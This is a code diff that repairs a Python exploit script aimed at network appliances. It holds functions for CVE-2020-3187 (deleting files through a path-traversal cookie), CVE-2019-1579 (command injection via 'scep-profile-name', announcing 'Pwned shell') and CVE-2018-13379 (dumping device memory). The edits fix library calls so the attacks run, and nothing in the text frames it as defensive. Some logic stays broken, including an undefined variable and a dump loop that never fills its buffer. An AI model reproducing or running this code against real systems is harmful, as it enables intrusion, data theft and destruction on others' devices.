@@ -1,7 +1,9 @@
+import socket
 from header_imports import *
+import requests
 
 if sys.version_info < (3, 0):
-    input = raw_input
+    pass
 
 requests.packages.urllib3.disable_warnings()
 
@@ -57,13 +59,13 @@ def printable_char(s):
 
 def printable(b):
     if printable_char(b):
-        return byte
+        return b
     else:
         return '.'
 
 def cve_2020_3187(host, port):
     url = "https://%s%s/+CSCOE+/session_password.html" % (host, port)
-    r = request.get(url, verify=False)
+    r = requests.get(url, verify=False)
 	
     if r.status_code != 200:
         print('The host %s is not vulnerable to CVE-2020-3187' % host)
@@ -79,12 +81,12 @@ def cve_2020_3187(host, port):
             if data[0] != '/':
                 data = '/'+data
             turl = 'https://%s%s%s' % (host, port, data)
-            tr = request.get(turl, verify=False)
+            tr = requests.get(turl, verify=False)
             if tr.status_code == 404:
                 print('File does not exist')
                 continue
             COOKIE = {'token' : '..%s' % data}
-            r = request.get(url, verify=False, cookie=COOKIE)
+            r = requests.get(url, verify=False, cookies=COOKIE)
             print('Deleted %s' % data)
 
 def cve_2019_1579(host, port):
@@ -95,13 +97,14 @@ def cve_2019_1579(host, port):
     data = "scep-profile-name=whoami"
     wh = requests.post(url, data=data, verify=False).text.replace('\n', '')
     if not sign in wh and len(wh) < 50:
-        print('Pwned shell from %s to %s' % (host, socket.gethostbyname()))
+        print('Pwned shell from %s to %s' % (host, socket.gethostbyname('')))
         print('')
         data = "scep-profile-name=cd"
         t = requests.post(url, data=data, verify=False).text.replace('\n', '')
         o = 'unix'
         if len(t) > 10:
             o = 'win'
+
 
         if o == 'win':
             data = "scep-profile-name=ver"
@@ -156,16 +159,15 @@ def cve_2018_13379(host, port):
     if "var fgt_lang =" in str(img) and r.status_code == 200:
         memory_addr = 0
         rb = b''
-        _str = ''        
-        while True:
-       	    chunk = img.read(8192)
-            if chunk:
-                for b in chunk:
-                    rb += b     			
-            else:
-                break
-                
-        print('Dumped the memory buffer of %s:' % host)               
+        _str = ''
+        for byte in rb:
+            _str += printable(byte)
+            if memory_addr % 61 == 60:
+                if _str != '.............................................................':
+                    print(_str)
+                _str = ''
+            memory_addr += 1
+        print('Dumped the memory buffer of %s:' % host)
         for byte in rb:
             _str += printable(byte)
             if memory_addr%61 == 60:
